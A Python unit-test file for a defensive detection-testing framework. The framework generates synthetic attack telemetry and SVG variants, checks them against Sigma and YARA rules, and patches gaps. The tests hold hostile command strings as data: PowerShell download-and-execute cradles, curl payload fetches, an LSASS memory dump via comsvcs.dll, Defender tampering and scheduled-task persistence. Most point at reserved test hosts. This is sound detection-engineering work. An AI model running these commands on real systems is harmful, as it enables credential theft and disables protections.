import json
import unittest
from pathlib import Path

from tools.swarm.adapter import SwarmAdapter
from tools.swarm.autonomous import AutonomousOrchestrator
from tools.swarm.cable_writer import CableWriter
from tools.swarm.config import OperatorDirective, SafetyConstraints
from tools.swarm.craftsmen.process_craftsman import ProcessCraftsman
from tools.swarm.craftsmen.svg_craftsman import SvgCraftsman
from tools.swarm.critic import SwarmCritic
from tools.swarm.detectors import SigmaDetector, YaraDetector
from tools.swarm.evaluator import MultiEventEvaluator, build_correlation_rule
from tools.swarm.export_layer import MitreLayerExporter
from tools.swarm.graph_engine import DetectionGraph, GraphEdge, GraphEngine, GraphNode
from tools.swarm.models import (
    BoundaryFinding,
    CorrelationRule,
    CorrelationStage,
    EventSequence,
    Variant,
)
from tools.swarm.orchestrator import SwarmOrchestrator
from tools.swarm.prompt_engine import PromptEngine
from tools.swarm.telemetry_generator import (
    CommandLineMutator,
    CommandSpec,
    TelemetryGenerator,
    TelemetrySafetyError,
)
from tools.swarm.validate_gate import GateReport, ZeroFalsePositiveGate
from tools.swarm.d3fend_mapper import (
    ATTACK_TO_D3FEND,
    BRIEFING_TECHNIQUES,
    D3fendMapper,
    mapping_source,
)
from tools.swarm.noise_floor import (
    DetectionMetricsCalculator,
    EnterpriseNoiseGenerator,
    NoiseFloorReport,
    RuleMetrics,
    run_benchmark,
)
from tools.swarm.siem_profiler import SiemQueryProfiler


class SwarmCriticTests(unittest.TestCase):
    """Verifies that the Critic enforces strict sandbox safety and syntax standards."""

    def setUp(self):
        self.critic = SwarmCritic()

    def test_critic_rejects_non_approved_domain(self):
        variant = Variant(
            id="test-1",
            target_type="yara",
            axis="syntax",
            mutation_name="bad_domain",
            description="Testing live domain rejection",
            payload='<svg xmlns="http://www.w3.org/2000/svg"><script>location.href="https://evil-live-site.com";</script></svg>',
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertFalse(verdict.passed)
        self.assertIn("Forbidden destination", verdict.reason)

    def test_critic_rejects_routable_ip(self):
        variant = Variant(
            id="test-2",
            target_type="sigma",
            axis="lolbin",
            mutation_name="bad_ip",
            description="Testing IP rejection",
            payload={
                "ParentImage": "C:\\Windows\\explorer.exe",
                "Image": "C:\\Windows\\System32\\curl.exe",
                "CommandLine": "curl.exe http://198.51.100.25/stage.bin",
            },
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertFalse(verdict.passed)
        self.assertIn("Routable IPv4", verdict.reason)

    def test_critic_rejects_invalid_xml_syntax(self):
        variant = Variant(
            id="test-3",
            target_type="yara",
            axis="structural",
            mutation_name="malformed_xml",
            description="Testing broken XML tags",
            payload='<svg xmlns="http://www.w3.org/2000/svg"><script>unclosed tag',
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertFalse(verdict.passed)
        self.assertFalse(verdict.syntax_valid)

    def test_critic_approves_safe_reserved_domain(self):
        variant = Variant(
            id="test-4",
            target_type="yara",
            axis="structural",
            mutation_name="valid_svg",
            description="Testing safe approved domain",
            payload='<svg xmlns="http://www.w3.org/2000/svg"><script>location.href="https://safe-test.invalid/p";</script></svg>',
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertTrue(verdict.passed, f"Safe variant rejected: {verdict.reason}")


class SwarmCraftsmanTests(unittest.TestCase):
    """Verifies that Craftsmen generate variants across requested cycles."""

    def test_svg_craftsman_generation(self):
        craftsman = SvgCraftsman()
        all_variants = []
        for cycle in (1, 2, 3):
            variants = craftsman.generate_variants(cycle=cycle)
            self.assertGreater(len(variants), 0, f"Cycle {cycle} produced 0 SVG variants")
            all_variants.extend(variants)
        self.assertGreaterEqual(len(all_variants), 8)

    def test_process_craftsman_generation(self):
        craftsman = ProcessCraftsman()
        all_variants = []
        for cycle in (1, 2, 3):
            variants = craftsman.generate_variants(cycle=cycle)
            self.assertGreater(len(variants), 0, f"Cycle {cycle} produced 0 process variants")
            all_variants.extend(variants)
        self.assertGreaterEqual(len(all_variants), 8)


class SwarmDetectorTests(unittest.TestCase):
    """Verifies local detector execution against synthetic variants."""

    def test_yara_detector_execution(self):
        detector = YaraDetector()
        variant = Variant(
            id="yara-test",
            target_type="yara",
            axis="structural",
            mutation_name="test_svg",
            description="test",
            payload=(
                '<svg xmlns="http://www.w3.org/2000/svg">\n'
                '  <script>window.location.href = "https://match.invalid";</script>\n'
                '</svg>'
            ),
            cycle=1,
        )
        result = detector.evaluate(variant)
        self.assertTrue(result.detected)

    def test_sigma_detector_execution(self):
        detector = SigmaDetector()
        variant = Variant(
            id="sigma-test",
            target_type="sigma",
            axis="syntax",
            mutation_name="test_proc",
            description="test",
            payload={
                "ParentImage": "C:\\Windows\\explorer.exe",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -w hidden -c \"irm https://test.invalid | iex\"",
            },
            cycle=1,
        )
        result = detector.evaluate(variant)
        self.assertTrue(result.detected)


class SwarmOrchestratorEndToEndTests(unittest.TestCase):
    """Verifies end-to-end multi-cycle closed-loop runs for both YARA and Sigma."""

    def test_yara_orchestrator_run(self):
        directive = OperatorDirective(
            target="yara",
            max_cycles=2,
            variants_per_cycle=4,
        )
        orchestrator = SwarmOrchestrator(directive)
        boundary_map, results = orchestrator.run()

        self.assertEqual(boundary_map.target_type, "yara")
        self.assertEqual(boundary_map.cycles_completed, 2)
        self.assertGreater(boundary_map.total_generated, 0)
        self.assertGreater(boundary_map.critic_approved, 0)
        self.assertGreater(len(results), 0)

    def test_sigma_orchestrator_run(self):
        directive = OperatorDirective(
            target="sigma",
            max_cycles=2,
            variants_per_cycle=4,
        )
        orchestrator = SwarmOrchestrator(directive)
        boundary_map, results = orchestrator.run()

        self.assertEqual(boundary_map.target_type, "sigma")
        self.assertEqual(boundary_map.cycles_completed, 2)
        self.assertGreater(boundary_map.total_generated, 0)
        self.assertGreater(boundary_map.critic_approved, 0)
        self.assertGreater(len(results), 0)



class PromptEngineTests(unittest.TestCase):
    """Verifies that PromptEngine translates natural language directives and generates valid variants."""

    def setUp(self):
        self.engine = PromptEngine()
        self.critic = SwarmCritic()

    def test_generate_from_custom_prompt_sigma(self):
        variant = self.engine.generate_from_prompt(
            "Simulate Explorer launching rundll32.exe url.dll,FileProtocolHandler",
            target_type="sigma",
        )
        self.assertEqual(variant.target_type, "sigma")
        self.assertEqual(variant.axis, "lolbin")
        self.assertIn("rundll32.exe", variant.payload["CommandLine"])
        verdict = self.critic.evaluate(variant)
        self.assertTrue(verdict.passed)

    def test_generate_from_custom_prompt_yara(self):
        variant = self.engine.generate_from_prompt(
            "Probe YARA scan window with 2048 bytes of comment padding and bracket property access",
            target_type="yara",
        )
        self.assertEqual(variant.target_type, "yara")
        self.assertIn("<!--", variant.payload)
        verdict = self.critic.evaluate(variant)
        self.assertTrue(verdict.passed)

    def test_generate_novel_hypotheses_are_valid(self):
        for target in ("sigma", "yara"):
            for idx in range(1, 5):
                prompt, variant = self.engine.generate_novel_hypothesis(target_type=target, index=idx)
                self.assertIsNotNone(prompt)
                verdict = self.critic.evaluate(variant)
                self.assertTrue(verdict.passed, f"Generated hypothesis rejected by critic: {verdict.reason}")


class AutonomousOrchestratorTests(unittest.TestCase):
    """Verifies continuous autonomous sparring loops and history persistence."""

    def test_autonomous_sparring_sigma(self):
        directive = OperatorDirective(
            target="sigma",
            max_cycles=1,
            variants_per_cycle=3,
        )
        auto_orch = AutonomousOrchestrator(directive)
        summary = auto_orch.run_autonomous(iterations=3)

        self.assertEqual(summary["iterations_run"], 3)
        self.assertGreaterEqual(summary["critic_approved"], 3)
        self.assertGreater(summary["detected_count"], 0)
        self.assertEqual(len(summary["history"]), 3)

    def test_autonomous_sparring_yara(self):
        directive = OperatorDirective(
            target="yara",
            max_cycles=1,
            variants_per_cycle=3,
        )
        auto_orch = AutonomousOrchestrator(directive)
        summary = auto_orch.run_autonomous(iterations=3)

        self.assertEqual(summary["iterations_run"], 3)
        self.assertGreaterEqual(summary["critic_approved"], 3)
        self.assertGreater(summary["detected_count"], 0)
        self.assertEqual(len(summary["history"]), 3)


class CableWriterTests(unittest.TestCase):
    """Verifies structured Threat Intelligence Cable authoring under ICD 203."""

    def test_next_cable_id_increments(self):
        writer = CableWriter()
        next_id = writer.get_next_cable_id()
        self.assertTrue(next_id.startswith("CABLE-2026-"))
        self.assertGreaterEqual(int(next_id.split("-")[-1]), 2)

    def test_format_and_write_cable(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            writer = CableWriter(cables_dir=Path(tmpdir))
            finding = BoundaryFinding(
                target_rule="proc_creation_win_explorer_clickfix_execution",
                target_type="sigma",
                cycle=1,
                variant_id="var-test",
                mutation_name="pcalua_proxy",
                axis="lolbin_proxy",
                detected=False,
                evasion_gap_found=True,
                root_cause="Explorer spawned pcalua.exe as an indirect execution proxy.",
                policy_recommendation="REC-SIGMA-006: Add pcalua.exe to monitored child images.",
            )
            variant = Variant(
                id="var-test",
                target_type="sigma",
                axis="lolbin_proxy",
                mutation_name="pcalua_proxy",
                description="Test directive",
                payload={"Image": "pcalua.exe", "CommandLine": "pcalua.exe -a powershell.exe -c irm"},
                cycle=1,
            )
            cable_path = writer.write_cable(
                finding=finding,
                variant=variant,
                patch_diff="+ selection_proxy_img:\n+   Image|endswith: ['\\pcalua.exe']",
                recommendation_id="REC-SIGMA-006",
                resilience_before=0.60,
                resilience_after=1.00,
            )
            self.assertTrue(cable_path.exists())
            content = cable_path.read_text(encoding="utf-8")
            self.assertIn("---", content)
            self.assertIn("cable_id:", content)
            self.assertIn("REC-SIGMA-006", content)
            self.assertIn("Diamond Model Analysis", content)
            self.assertIn("Epistemological Framework", content)
            self.assertIn("Observed Fact", content)
            self.assertIn("Analytical Judgment", content)

            # Check index file was updated
            index_path = Path(tmpdir) / "INDEX.md"
            self.assertTrue(index_path.exists())
            self.assertIn("pcalua_proxy", index_path.read_text(encoding="utf-8"))

    def test_format_and_write_campaign_cable(self):
        import tempfile
        from tools.swarm.models import CampaignResult, CriticVerdict, DetectionResult, StageResult, Variant

        with tempfile.TemporaryDirectory() as tmpdir:
            writer = CableWriter(cables_dir=Path(tmpdir))
            variant = Variant(
                id="var-camp-1",
                target_type="sigma",
                axis="defense_in_depth",
                mutation_name="rundll32_eval",
                description="Rundll32 dump stage",
                payload={"Image": "rundll32.exe"},
                cycle=1,
            )
            stage1 = StageResult(
                stage_number=1,
                stage_name="Credential Access",
                tactic="credential_access",
                technique_id="T1003.001",
                rule_name="proc_creation_win_rundll32_lsass_dump",
                target_type="sigma",
                variant=variant,
                critic_verdict=CriticVerdict(variant_id=variant.id, passed=True, reason="Safe"),
                detection_result=DetectionResult(
                    variant_id=variant.id,
                    rule_name="proc_creation_win_rundll32_lsass_dump",
                    detected=True,
                ),
                evasion_gap=False,
            )
            cr = CampaignResult(
                campaign_id="CAMP-2026-TEST",
                campaign_name="Ransomware-Intrusion",
                stages=[stage1],
                intercepted=True,
                interception_stage="Credential Access",
                interception_technique="T1003.001",
                completed_stages=1,
                total_stages=1,
                depth_of_defense_score=0.85,
            )
            cable_path = writer.write_campaign_cable(cr)
            self.assertTrue(cable_path.exists())
            content = cable_path.read_text(encoding="utf-8")
            self.assertIn("campaign_id: CAMP-2026-TEST", content)
            self.assertIn("Ransomware-Intrusion", content)
            self.assertIn("T1003.001", content)
            self.assertIn("Depth-of-Defense", content)

            index_path = Path(tmpdir) / "INDEX.md"
            self.assertTrue(index_path.exists())
            self.assertIn("Ransomware-Intrusion", index_path.read_text(encoding="utf-8"))


class SwarmAdapterTests(unittest.TestCase):
    """Verifies Adapter agent self-healing patch synthesis and in-memory verification."""

    def test_heal_sigma_gap_candidate(self):
        adapter = SwarmAdapter()
        finding = BoundaryFinding(
            target_rule="proc_creation_win_explorer_clickfix_execution",
            target_type="sigma",
            cycle=1,
            variant_id="var-pcalua",
            mutation_name="pcalua_proxy",
            axis="lolbin_proxy",
            detected=False,
            evasion_gap_found=True,
            root_cause="Explorer spawned pcalua.exe to proxy execution.",
            policy_recommendation="REC-SIGMA-006: Add pcalua.exe to monitored child images.",
        )
        engine = PromptEngine()
        variant = engine.generate_from_prompt("Simulate Explorer launching pcalua.exe to proxy powershell download", target_type="sigma")
        rule_path = adapter.rules_dir / "sigma" / "proc_creation_win_explorer_clickfix_execution.yml"
        patched, rec_id, diff = adapter._synthesize_sigma_patch(rule_path, finding, variant)

        self.assertIsNotNone(patched)
        self.assertIn("selection_proxy_img", patched)
        self.assertIn("\\pcalua.exe", patched)
        self.assertEqual(rec_id, "REC-SIGMA-006")
        self.assertTrue(len(diff) > 0)

        # Verify candidate patch detects the variant
        is_verified = adapter._verify_patch(rule_path, patched, "sigma", variant)
        self.assertTrue(is_verified)

    def test_heal_yara_gap_candidate(self):
        adapter = SwarmAdapter()
        finding = BoundaryFinding(
            target_rule="Suspicious_Active_Content_SVG_Attachment",
            target_type="yara",
            cycle=1,
            variant_id="var-svg-meta",
            mutation_name="svg_foreignobject",
            axis="parser_differential",
            detected=False,
            evasion_gap_found=True,
            root_cause="SVG wraps HTML meta-refresh inside foreignObject.",
            policy_recommendation="REC-YARA-004: Add foreignObject and meta refresh to active content.",
        )
        engine = PromptEngine()
        variant = engine.generate_from_prompt("Test SVG foreignObject containing HTML meta-refresh redirect to external URL", target_type="yara")
        rule_path = adapter.rules_dir / "yara" / "suspicious_active_content_svg.yar"
        patched, rec_id, diff = adapter._synthesize_yara_patch(rule_path, finding, variant)

        self.assertIsNotNone(patched)
        self.assertIn("$foreign_meta_refresh", patched)
        self.assertEqual(rec_id, "REC-YARA-004")
        self.assertTrue(len(diff) > 0)

        # Verify candidate patch detects the variant
        is_verified = adapter._verify_patch(rule_path, patched, "yara", variant)
        self.assertTrue(is_verified)

    def test_resolve_rule_path_all_rules(self):
        adapter = SwarmAdapter()

        # 1. ClickFix resolution (stem, title, alias)
        f_click = BoundaryFinding(target_rule="proc_creation_win_explorer_clickfix_execution", target_type="sigma", axis="", mutation_name="", detected=False, evasion_gap_found=True, root_cause="", policy_recommendation="")
        self.assertEqual(adapter.resolve_rule_path(f_click).name, "proc_creation_win_explorer_clickfix_execution.yml")

        f_click_title = BoundaryFinding(target_rule="Suspicious Process Spawning From Explorer Run Prompt (ClickFix Pattern)", target_type="sigma", axis="", mutation_name="", detected=False, evasion_gap_found=True, root_cause="", policy_recommendation="")
        self.assertEqual(adapter.resolve_rule_path(f_click_title).name, "proc_creation_win_explorer_clickfix_execution.yml")

        # 2. Schtasks persistence resolution (stem, title, alias)
        f_sch = BoundaryFinding(target_rule="proc_creation_win_schtasks_persistence", target_type="sigma", axis="", mutation_name="", detected=False, evasion_gap_found=True, root_cause="", policy_recommendation="")
        self.assertEqual(adapter.resolve_rule_path(f_sch).name, "proc_creation_win_schtasks_persistence.yml")

        f_sch_title = BoundaryFinding(target_rule="Suspicious Scheduled Task Creation Spawning Shell or Script Engine", target_type="sigma", axis="", mutation_name="", detected=False, evasion_gap_found=True, root_cause="", policy_recommendation="")
        self.assertEqual(adapter.resolve_rule_path(f_sch_title).name, "proc_creation_win_schtasks_persistence.yml")

        # 3. LSASS memory dump resolution (stem, title, alias)
        f_lsass = BoundaryFinding(target_rule="proc_creation_win_rundll32_lsass_dump", target_type="sigma", axis="", mutation_name="", detected=False, evasion_gap_found=True, root_cause="", policy_recommendation="")
        self.assertEqual(adapter.resolve_rule_path(f_lsass).name, "proc_creation_win_rundll32_lsass_dump.yml")

        f_lsass_title = BoundaryFinding(target_rule="LSASS Process Memory Dump via Rundll32 Comsvcs.dll", target_type="sigma", axis="", mutation_name="", detected=False, evasion_gap_found=True, root_cause="", policy_recommendation="")
        self.assertEqual(adapter.resolve_rule_path(f_lsass_title).name, "proc_creation_win_rundll32_lsass_dump.yml")

        # 4. Tampering resolution (stem, title, alias)
        f_tamp = BoundaryFinding(target_rule="proc_creation_win_defense_evasion_tampering", target_type="sigma", axis="", mutation_name="", detected=False, evasion_gap_found=True, root_cause="", policy_recommendation="")
        self.assertEqual(adapter.resolve_rule_path(f_tamp).name, "proc_creation_win_defense_evasion_tampering.yml")

        f_tamp_title = BoundaryFinding(target_rule="Suspicious Event Log Clearing or Security Software Tampering", target_type="sigma", axis="", mutation_name="", detected=False, evasion_gap_found=True, root_cause="", policy_recommendation="")
        self.assertEqual(adapter.resolve_rule_path(f_tamp_title).name, "proc_creation_win_defense_evasion_tampering.yml")

        # 5. YARA resolution
        f_yara = BoundaryFinding(target_rule="Suspicious_Active_Content_SVG_Attachment", target_type="yara", axis="", mutation_name="", detected=False, evasion_gap_found=True, root_cause="", policy_recommendation="")
        self.assertEqual(adapter.resolve_rule_path(f_yara).name, "suspicious_active_content_svg.yar")

        # 6. Unknown rule returns None
        f_unk = BoundaryFinding(target_rule="completely_nonexistent_analytic_xyz", target_type="sigma", axis="", mutation_name="", detected=False, evasion_gap_found=True, root_cause="", policy_recommendation="")
        self.assertIsNone(adapter.resolve_rule_path(f_unk))

    def test_heal_gap_resolves_and_patches_schtasks(self):
        import tempfile
        import shutil
        tmp_dir = tempfile.mkdtemp()
        try:
            cw = CableWriter(cables_dir=Path(tmp_dir))
            adapter = SwarmAdapter(cable_writer=cw)
            finding = BoundaryFinding(
                target_rule="Suspicious Scheduled Task Creation Spawning Shell or Script Engine",
                target_type="sigma",
                cycle=1,
                variant_id="var-schtasks-daily",
                mutation_name="schtasks_daily_trigger",
                axis="trigger",
                detected=False,
                evasion_gap_found=True,
                root_cause="Adversary created scheduled task with /sc daily trigger.",
                policy_recommendation="REC-SIGMA-SCHTASKS-001: Add daily trigger to monitored schedules.",
            )
            event_payload = {
                "EventID": 1,
                "Image": "C:\\Windows\\System32\\schtasks.exe",
                "CommandLine": "schtasks.exe /create /tn UpdateTask /tr powershell.exe /sc daily",
                "User": "SYSTEM",
            }
            variant = Variant(
                id="var-schtasks-daily",
                target_type="sigma",
                axis="trigger",
                mutation_name="schtasks_daily_trigger",
                description="Daily schtasks creation",
                payload=event_payload,
                cycle=1,
            )
            success, cable_path, diff = adapter.heal_gap(finding, variant, apply_patch=False)
            self.assertTrue(success)
            self.assertIsNotNone(cable_path)
            self.assertIn("proc_creation_win_schtasks_persistence.yml", diff)
            self.assertNotIn("proc_creation_win_explorer_clickfix_execution.yml", diff)
            self.assertIn("/sc daily", diff)
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_heal_gap_resolves_and_patches_lsass(self):
        import tempfile
        import shutil
        tmp_dir = tempfile.mkdtemp()
        try:
            cw = CableWriter(cables_dir=Path(tmp_dir))
            adapter = SwarmAdapter(cable_writer=cw)
            finding = BoundaryFinding(
                target_rule="LSASS Process Memory Dump via Rundll32 Comsvcs.dll",
                target_type="sigma",
                cycle=1,
                variant_id="var-lsass-ordinal",
                mutation_name="rundll32_ordinal_variant",
                axis="syntax",
                detected=False,
                evasion_gap_found=True,
                root_cause="Adversary invoked comsvcs ordinal #0024 to dump LSASS.",
                policy_recommendation="REC-SIGMA-LSASS-001: Expand ordinal match to include #0024.",
            )
            event_payload = {
                "EventID": 1,
                "Image": "C:\\Windows\\System32\\rundll32.exe",
                "CommandLine": "rundll32.exe C:\\windows\\system32\\comsvcs.dll #0024 1234 C:\\temp\\lsass.dmp full",
                "User": "NT AUTHORITY\\SYSTEM",
            }
            variant = Variant(
                id="var-lsass-ordinal",
                target_type="sigma",
                axis="syntax",
                mutation_name="rundll32_ordinal_variant",
                description="Rundll32 comsvcs #0024 dump",
                payload=event_payload,
                cycle=1,
            )
            success, cable_path, diff = adapter.heal_gap(finding, variant, apply_patch=False)
            self.assertTrue(success)
            self.assertIsNotNone(cable_path)
            self.assertIn("proc_creation_win_rundll32_lsass_dump.yml", diff)
            self.assertNotIn("proc_creation_win_explorer_clickfix_execution.yml", diff)
            self.assertIn("#0024", diff)
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_heal_gap_resolves_and_patches_tampering(self):
        import tempfile
        import shutil
        tmp_dir = tempfile.mkdtemp()
        try:
            cw = CableWriter(cables_dir=Path(tmp_dir))
            adapter = SwarmAdapter(cable_writer=cw)
            finding = BoundaryFinding(
                target_rule="Suspicious Event Log Clearing or Security Software Tampering",
                target_type="sigma",
                cycle=1,
                variant_id="var-defender-remove",
                mutation_name="defender_remove_preference",
                axis="tamper",
                detected=False,
                evasion_gap_found=True,
                root_cause="Adversary disabled protection using Remove-MpPreference.",
                policy_recommendation="REC-SIGMA-TAMPER-001: Add Remove-MpPreference to monitored tampering cmdlets.",
            )
            event_payload = {
                "EventID": 1,
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe Remove-MpPreference -DisableRealtimeMonitoring $true",
                "User": "SYSTEM",
            }
            variant = Variant(
                id="var-defender-remove",
                target_type="sigma",
                axis="tamper",
                mutation_name="defender_remove_preference",
                description="Remove-MpPreference tampering",
                payload=event_payload,
                cycle=1,
            )
            success, cable_path, diff = adapter.heal_gap(finding, variant, apply_patch=False)
            self.assertTrue(success)
            self.assertIsNotNone(cable_path)
            self.assertIn("proc_creation_win_defense_evasion_tampering.yml", diff)
            self.assertNotIn("proc_creation_win_explorer_clickfix_execution.yml", diff)
            self.assertIn("Remove-MpPreference", diff)
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_heal_gap_unknown_rule_fails_cleanly(self):
        adapter = SwarmAdapter()
        finding = BoundaryFinding(
            target_rule="completely_nonexistent_analytic_xyz",
            target_type="sigma",
            cycle=1,
            variant_id="var-unknown",
            mutation_name="unknown_mutation",
            axis="unknown",
            detected=False,
            evasion_gap_found=True,
            root_cause="Unknown",
            policy_recommendation="None",
        )
        variant = Variant(
            id="var-unknown",
            target_type="sigma",
            axis="unknown",
            mutation_name="unknown_mutation",
            description="unknown",
            payload={},
            cycle=1,
        )
        success, cable_path, err = adapter.heal_gap(finding, variant, apply_patch=False)
        self.assertFalse(success)
        self.assertIsNone(cable_path)
        self.assertIn("could not be resolved", err)


class CampaignOrchestratorTests(unittest.TestCase):
    """Evaluates multi-stage kill chain campaign simulation and defense-in-depth scoring."""

    def test_run_campaign_end_to_end(self):
        from tools.swarm.campaign import CampaignOrchestrator
        orchestrator = CampaignOrchestrator()
        result = orchestrator.run_campaign(
            campaign_name="Test-Stealer-Flow",
            campaign_id="TEST-CAMP-001",
            evasion_at_stages=[2],
        )

        self.assertEqual(result.total_stages, 5)
        self.assertEqual(len(result.stages), 5)
        self.assertTrue(result.intercepted)
        self.assertEqual(result.interception_stage, "Initial Access")
        self.assertGreater(result.depth_of_defense_score, 0.0)

        # Verify Stage 2 was an evasion gap while Stage 1, 3, 4, 5 were detected
        st2 = [s for s in result.stages if s.stage_number == 2][0]
        self.assertTrue(st2.evasion_gap)

        st3 = [s for s in result.stages if s.stage_number == 3][0]
        self.assertFalse(st3.evasion_gap)

        st4 = [s for s in result.stages if s.stage_number == 4][0]
        self.assertFalse(st4.evasion_gap)

    def test_run_autonomous_campaigns_multi_iterations(self):
        from tools.swarm.campaign import CampaignOrchestrator
        orchestrator = CampaignOrchestrator()
        results = orchestrator.run_autonomous_campaigns(iterations=3)

        self.assertEqual(len(results), 3)
        for r in results:
            self.assertEqual(r.total_stages, 5)
            self.assertTrue(r.intercepted)
            self.assertGreater(r.depth_of_defense_score, 0.0)


class StrategicSynthesizerTests(unittest.TestCase):
    """Evaluates strategic trend synthesis, clustering, and meta-cable generation."""

    def test_synthesize_report_and_cable(self):
        import tempfile
        import shutil
        from tools.swarm.synthesizer import StrategicSynthesizer

        temp_cables = Path(tempfile.mkdtemp())
        temp_results = Path(tempfile.mkdtemp())
        try:
            # Create a mock incident cable
            mock_cable = temp_cables / "CABLE-2026-001-test.md"
            mock_cable.write_text(
                "---\n"
                "cable_id: CABLE-2026-001\n"
                "campaign_type: multi_stage_kill_chain\n"
                "intercepted: true\n"
                "depth_of_defense_score: 0.80\n"
                "---\n"
                "# Test Cable\n",
                encoding="utf-8",
            )
            # Create a mock index
            (temp_cables / "INDEX.md").write_text("# Index\n", encoding="utf-8")

            synthesizer = StrategicSynthesizer(cables_dir=temp_cables, results_dir=temp_results)
            output_path, stats = synthesizer.synthesize(total_evals_override=100, gaps_count_override=25)

            self.assertTrue(output_path.exists())
            self.assertEqual(stats["total_evaluations"], 100)
            self.assertEqual(stats["gaps_discovered"], 25)
            self.assertEqual(stats["resilience_rate"], 0.75)
            self.assertIn("CABLE-", stats["cable_id"])
            self.assertIn("STRAT", stats["cable_id"])

            content = output_path.read_text(encoding="utf-8")
            self.assertIn("Strategic Intelligence Cable", content)
            self.assertIn("Cluster A: LOLBin & Process Proxying", content)
            self.assertIn("Empirical Analysis of 100 Autonomous Adversarial Swarm Probes", content)
        finally:
            shutil.rmtree(temp_cables, ignore_errors=True)
            shutil.rmtree(temp_results, ignore_errors=True)


class TelemetryGeneratorTests(unittest.TestCase):
    """EPIC 1 — Verifies schema-driven telemetry generation, mutation, and safety validation."""

    def setUp(self):
        self.gen = TelemetryGenerator(seed=1337)
        self.spec = CommandSpec(
            binary="powershell.exe",
            image_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            args=["-w", "hidden", "-c", "irm https://cdn.delivery.stage.invalid/u.ps1 | iex"],
        )

    def test_process_creation_eid1_schema(self):
        event = self.gen.process_creation(
            image_path=self.spec.image_path,
            command_line=self.spec.render(),
        )
        self.assertEqual(event.event_id, 1)
        self.assertIn("Image", event.fields)
        self.assertIn("ParentImage", event.fields)
        self.assertIn("CommandLine", event.fields)
        record = event.to_record()
        self.assertEqual(record["EventID"], 1)

    def test_security_4688_schema(self):
        event = self.gen.process_creation(
            image_path=self.spec.image_path, command_line=self.spec.render(), as_4688=True
        )
        self.assertEqual(event.event_id, 4688)
        self.assertIn("NewProcessName", event.fields)
        self.assertIn("ParentProcessName", event.fields)

    def test_integer_switch_mutation(self):
        mutator = CommandLineMutator()
        name, mutated = mutator.integer_switch(self.spec)
        self.assertEqual(name, "integer_switch")
        self.assertIn("-w 1", mutated)
        self.assertNotIn("-w hidden", mutated)

    def test_whitespace_mutation_preserves_tokens(self):
        mutator = CommandLineMutator()
        _name, mutated = mutator.whitespace(self.spec)
        self.assertIn("powershell.exe", mutated)
        self.assertTrue("  " in mutated or "\t" in mutated)

    def test_wrapper_mutation_rehomes_image(self):
        mutator = CommandLineMutator()
        name, wrapped, image_path, binary = mutator.wrapper(self.spec, "wt")
        self.assertEqual(name, "wrapper_wt")
        self.assertTrue(wrapped.startswith("wt.exe"))
        self.assertTrue(image_path.endswith("wt.exe"))
        self.assertEqual(binary, "wt.exe")

    def test_generate_variations_are_all_valid(self):
        events = self.gen.generate_variations(self.spec)
        self.assertGreaterEqual(len(events), 3)
        for event in events:
            self.assertIn("MutationName", event.fields)
            # validate() must not raise on any generated record
            self.gen.validate(event)
        names = {e.fields["MutationName"] for e in events}
        self.assertIn("baseline", names)

    def test_offline_mock_collapses_to_baseline(self):
        gen = TelemetryGenerator(offline_mock=True)
        events = gen.generate_variations(self.spec)
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].fields["MutationName"], "baseline")

    def test_all_event_families_validate(self):
        self.gen.reset_timeline()
        self.gen.image_load("C:\\a.exe", "C:\\Windows\\System32\\comsvcs.dll")
        self.gen.process_access("C:\\a.exe", "C:\\Windows\\System32\\lsass.exe", "0x1010")
        self.gen.file_create("C:\\a.exe", "C:\\Temp\\out.bin")
        self.gen.script_block("IEX (New-Object Net.WebClient).DownloadString('https://x.stage.invalid/a')")
        # No exception implies all families passed schema + safety validation.

    def test_safety_rejects_routable_ip(self):
        with self.assertRaises(TelemetrySafetyError):
            self.gen.process_creation(
                image_path="C:\\Windows\\System32\\curl.exe",
                command_line="curl.exe http://8.8.8.8/payload.bin -o a.exe",
            )

    def test_safety_rejects_forbidden_domain(self):
        with self.assertRaises(TelemetrySafetyError):
            self.gen.process_creation(
                image_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                command_line="powershell.exe -c irm https://evil-live-site.com/p | iex",
            )

    def test_test_net_endpoints_are_allowed(self):
        # RFC 5737 test-nets must be accepted.
        event = self.gen.process_creation(
            image_path="C:\\Windows\\System32\\curl.exe",
            command_line="curl.exe http://203.0.113.10/a.bin -o %TEMP%\\a",
        )
        self.assertEqual(event.event_id, 1)

    def test_epoch_parsing_orders_events(self):
        gen = TelemetryGenerator(base_time="2026-09-03 14:00:00", dwell_seconds=5)
        e1 = gen.process_creation("C:\\a.exe", "a.exe")
        e2 = gen.process_creation("C:\\b.exe", "b.exe")
        self.assertLess(e1.epoch(), e2.epoch())


class MultiEventEvaluatorTests(unittest.TestCase):
    """EPIC 3 — Verifies multi-event Sigma evaluation and temporal correlation windows."""

    SCRIPTBLOCK_RULE = "rules/sigma/correlation/posh_script_block_download_cradle.yml"
    PROCACCESS_RULE = "rules/sigma/correlation/sysmon_process_access_lsass.yml"

    def setUp(self):
        self.ev = MultiEventEvaluator()
        self.gen = TelemetryGenerator(base_time="2026-09-03 14:00:00", dwell_seconds=5)

    def _cred_sequence(self, dwell=5):
        gen = TelemetryGenerator(base_time="2026-09-03 14:00:00", dwell_seconds=dwell)
        seq = EventSequence(sequence_id="cred")
        seq.add(gen.process_access("C:\\Temp\\svc.exe", "C:\\Windows\\System32\\lsass.exe", "0x1010"))
        seq.add(gen.file_create("C:\\Temp\\svc.exe", "C:\\Temp\\out.bin"))
        return seq

    def test_evaluate_rule_matches_script_block(self):
        self.gen.reset_timeline()
        seq = EventSequence(sequence_id="s")
        seq.add(self.gen.script_block("$w = New-Object Net.WebClient; IEX $w.DownloadString('https://x.stage.invalid/a.ps1')"))
